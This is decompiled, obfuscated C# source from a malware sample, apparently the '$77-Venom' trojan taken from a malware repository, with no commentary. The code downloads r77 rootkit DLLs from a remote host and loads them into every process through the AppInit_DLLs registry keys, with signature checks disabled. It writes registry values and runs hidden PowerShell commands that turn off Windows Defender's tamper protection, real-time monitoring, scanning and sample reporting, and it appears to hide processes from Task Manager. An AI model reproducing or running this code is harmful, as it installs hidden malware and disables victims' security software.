// Decompiled with JetBrains decompiler
// Type: 문隬퓙昒萴㍵鹁킞ꝩ쐑藃록څ缆㏱寱膱藥
// Assembly: $77-Venom, Version=2.1.0.0, Culture=neutral, PublicKeyToken=null
// MVID: DC8E8704-647D-4CA7-99AB-BB7BE936B486
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\HEUR-Trojan.MSIL.Zapchast.gen-815b2bf1ddadfb46a27001e08246e8f82f629eb793963bef856d17e1ef9c4085.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Principal;

public class 문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥
{
  [DllImport("kernel32.dll", EntryPoint = "GetCurrentProcess")]
  public static extern IntPtr 鵣帪먙ꫥꑝ\u177B\uEB27ݔ剎꾺콰\uE9A9\uA9C2\u327B\u2441Ǚ\u0B12羫㻭\uFFFD();

  public static void \uFFFD稆\uF5E7仝ꌵ뗬\u2BE4\u2F28ߚ宱鷔\uFFFD㳟র鶒㩼ÿ\uE3B3퉢罫()
  {
    IntPtr num = 문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.鵣帪먙ꫥꑝ\u177B\uEB27ݔ剎꾺콰\uE9A9\uA9C2\u327B\u2441Ǚ\u0B12羫㻭\uFFFD();
    䲚좛嘑ų疗\u2A26ꅜ茹嶒\u2283끸\uFFFDꈹ給봞\uF7F3\u28CC繴驉ﳺ 䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ = new 䲚좛嘑ų疗\u2A26ꅜ茹嶒\u2283끸\uFFFDꈹ給봞\uF7F3\u28CC繴驉ﳺ(彍᩷\uF4A6佽谧ꆙᕻ첫尯氏텦肈휺뭿㪿ᗠᑆ鐅踯西.പᳰ烟䣤ᖗ\uFFFD䩓䥶ᬳ덀수匃Ꝿ㮆ް䊶ৈ羹\uFFFD\uFFFD((string) null, "Task Manager"));
    while (䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ.lhWndParent != IntPtr.Zero)
    {
      Console.Write((object) num);
      string procName = Console.In.ReadLine();
      int index = 䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ.Յ䔱\uEB6B萡\uFFFD\uFFFDꞬ旃ᣯᩢ䱖Ệ驑\uEE90颇\uA70F卲썐\uF549耿(procName);
      䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ.ͽ眙箁휬꽊ᢄ숸ﷲ傶陰\uA838鯂ュ땑醭樍\u104C鴖棚嵢(true);
      䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ.\uEB9E\uFFFD巘繊汍\u2684\u1CBB\uF597䯯\u3250\uE119쓂ҟ説\u192Fᚴ膗ር癨쎇(index);
      䲚좛嘑ų疗ꅜ茹嶒끸ꈹ給봞繴驉ﳺ.ͽ眙箁휬꽊ᢄ숸ﷲ傶陰\uA838鯂ュ땑醭樍\u104C鴖棚嵢(false);
    }
  }

  public static void 満랪팷꾌籐\uFFFD덂\u136B菐\uF62C\u2A06\uE011\u209D퍞\u2A25蹐獹ፏ쟘\u0CF6(bool is64bit)
  {
    string path1 = Path.Combine(仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.ﭞ軈쉈\u0A04\uEA79\u208F\uF34A瓖髿\uEE29䟜뾏\u2B75褨詚둬\u2666ዅ뛧쿐, 仂읤\uEC15솟콱윯蠻ꉹὲ樠ꮟ듌ﭤ뒉無롫ങ秽\u259B䀂.돷ꖓ偓连ဵ膔\uA87E섛\uEC24馷옛ᐱ玄몋进춥빮\uF26E\uEC79\uFFFD);
    if (문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u2AD1毭깘ꃝ癏\uE577\uEC48Ҁ亿軲ꌗꜴ姚\u2B65슫秧ὒ떤龡ᶉ())
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name1 = "r77-x64.dll";
      string name2 = "r77-x86.dll";
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\u2BD0앫\uF554됛\uFFC0\uECA0\u27B0狗\uE7EA秎끡옡\u086Cᐌꏀ\uF7EC䤢틕\uE710ᦳ("https://payloads-poison.000webhostapp.com/r77-x64.dll", name1);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\u2BD0앫\uF554됛\uFFC0\uECA0\u27B0狗\uE7EA秎끡옡\u086Cᐌꏀ\uF7EC䤢틕\uE710ᦳ(link, name2);
      string str1 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str2 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str1);
      File.Copy(Path.Combine(path1, "r77-" + str1), str2);
      new FileInfo(str2).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str2);
      }
      string path2 = Path.Combine(path1, "r77-x64.dll");
      string path3 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path2, FileAttributes.Hidden);
      File.SetAttributes(path3, FileAttributes.Hidden);
    }
    else
    {
      string link = "https://payloads-poison.000webhostapp.com/r77-x86.dll";
      string name3 = "r77-x64.dll";
      string name4 = "r77-x86.dll";
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\u2BD0앫\uF554됛\uFFC0\uECA0\u27B0狗\uE7EA秎끡옡\u086Cᐌꏀ\uF7EC䤢틕\uE710ᦳ("https://payloads-poison.000webhostapp.com/r77-x64.dll", name3);
      ᒆ\uE9CD藷䰈콩헣\u248D榪쒷\uE171椐菹粉邀ꀥ퓱㖧鍁맯䎜.\u2BD0앫\uF554됛\uFFC0\uECA0\u27B0狗\uE7EA秎끡옡\u086Cᐌꏀ\uF7EC䤢틕\uE710ᦳ(link, name4);
      string str3 = "x" + (is64bit ? 64 : 86).ToString() + ".dll";
      string str4 = Path.Combine(Path.GetTempPath(), "$77-" + Guid.NewGuid().ToString("N") + "-" + str3);
      File.Copy(Path.Combine(path1, "r77-" + str3), str4);
      new FileInfo(str4).Attributes |= FileAttributes.Temporary;
      using (RegistryKey registryKey = RegistryKey.OpenBaseKey(RegistryHive.LocalMachine, is64bit ? RegistryView.Registry64 : RegistryView.Registry32).OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Windows", true))
      {
        registryKey.SetValue("LoadAppInit_DLLs", (object) 1);
        registryKey.SetValue("RequireSignedAppInit_DLLs", (object) 0);
        registryKey.SetValue("AppInit_DLLs", (object) str4);
      }
      string path4 = Path.Combine(path1, "r77-x64.dll");
      string path5 = Path.Combine(path1, "r77-x86.dll");
      File.SetAttributes(path4, FileAttributes.Hidden);
      File.SetAttributes(path5, FileAttributes.Hidden);
    }
  }

  public static bool \u2AD1毭깘ꃝ癏\uE577\uEC48Ҁ亿軲ꌗꜴ姚\u2B65슫秧ὒ떤龡ᶉ() => new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);

  public static void 橝셙譚㰢\u3304\uFAE1깔拷ṧ\uE53F\uF4D2䢄ᔯ\uF054\u299Eዅ\uE89F괌汹褂()
  {
    if (!new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator))
      return;
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5("SOFTWARE\\Microsoft\\Windows Defender\\Features", "TamperProtection", "0");
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5("SOFTWARE\\Policies\\Microsoft\\Windows Defender", "DisableAntiSpyware", "1");
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableBehaviorMonitoring", "1");
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableOnAccessProtection", "1");
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5("SOFTWARE\\Policies\\Microsoft\\Windows Defender\\Real-Time Protection", "DisableScanOnRealtimeEnable", "1");
    문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\uE6CC\uFF5E\u25A5덾류棶풦\uF25B珢ྷ\u21C5숣\u137B翪鮏쌇䝔恹\uF8E4뻧();
  }

  private static void 꺀Ꮴ趰脍\uFFFD\uA491쳇킻頿鲡\u212Eꧺ\u02F8\uF0A5\uF6AA\u2459\uE756ဝ쬉\u28E5(
    string regPath,
    string name,
    string value)
  {
    try
    {
      using (RegistryKey registryKey = Registry.LocalMachine.OpenSubKey(regPath, RegistryKeyPermissionCheck.ReadWriteSubTree))
      {
        if (registryKey == null)
        {
          Registry.LocalMachine.CreateSubKey(regPath).SetValue(name, (object) value, RegistryValueKind.DWord);
        }
        else
        {
          if (registryKey.GetValue(name) == (object) value)
            return;
          registryKey.SetValue(name, (object) value, RegistryValueKind.DWord);
        }
      }
    }
    catch
    {
    }
  }

  private static void \uE6CC\uFF5E\u25A5덾류棶풦\uF25B珢ྷ\u21C5숣\u137B翪鮏쌇䝔恹\uF8E4뻧()
  {
    Process process = new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = "Get-MpPreference -verbose",
        UseShellExecute = false,
        RedirectStandardOutput = true,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    };
    process.Start();
    while (!process.StandardOutput.EndOfStream)
    {
      string str = process.StandardOutput.ReadLine();
      if (str.StartsWith("DisableRealtimeMonitoring") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableRealtimeMonitoring $true");
      else if (str.StartsWith("DisableBehaviorMonitoring") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableBehaviorMonitoring $true");
      else if (str.StartsWith("DisableBlockAtFirstSeen") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableBlockAtFirstSeen $true");
      else if (str.StartsWith("DisableIOAVProtection") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableIOAVProtection $true");
      else if (str.StartsWith("DisablePrivacyMode") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisablePrivacyMode $true");
      else if (str.StartsWith("SignatureDisableUpdateOnStartupWithoutEngine") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -SignatureDisableUpdateOnStartupWithoutEngine $true");
      else if (str.StartsWith("DisableArchiveScanning") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableArchiveScanning $true");
      else if (str.StartsWith("DisableIntrusionPreventionSystem") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableIntrusionPreventionSystem $true");
      else if (str.StartsWith("DisableScriptScanning") && str.EndsWith("False"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -DisableScriptScanning $true");
      else if (str.StartsWith("SubmitSamplesConsent") && !str.EndsWith("2"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -SubmitSamplesConsent 2");
      else if (str.StartsWith("MAPSReporting") && !str.EndsWith("0"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -MAPSReporting 0");
      else if (str.StartsWith("HighThreatDefaultAction") && !str.EndsWith("6"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -HighThreatDefaultAction 6 -Force");
      else if (str.StartsWith("ModerateThreatDefaultAction") && !str.EndsWith("6"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -ModerateThreatDefaultAction 6");
      else if (str.StartsWith("LowThreatDefaultAction") && !str.EndsWith("6"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -LowThreatDefaultAction 6");
      else if (str.StartsWith("SevereThreatDefaultAction") && !str.EndsWith("6"))
        문隬퓙昒萴\u3375鹁킞ꝩ쐑藃록څ缆\u33F1寱\uEDDE膱\uEE6A藥.\u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638("Set-MpPreference -SevereThreatDefaultAction 6");
    }
  }

  private static void \u281D\uF12A䪌\u2936ꪗ\u1ACA㱳\u301E責\u1CBD送䍪\uF378Ꮸ㐗\u1AFD\u3208遽\uF524\uF638(
    string args)
  {
    new Process()
    {
      StartInfo = new ProcessStartInfo()
      {
        FileName = "powershell",
        Arguments = args,
        WindowStyle = ProcessWindowStyle.Hidden,
        CreateNoWindow = true
      }
    }.Start();
  }
}
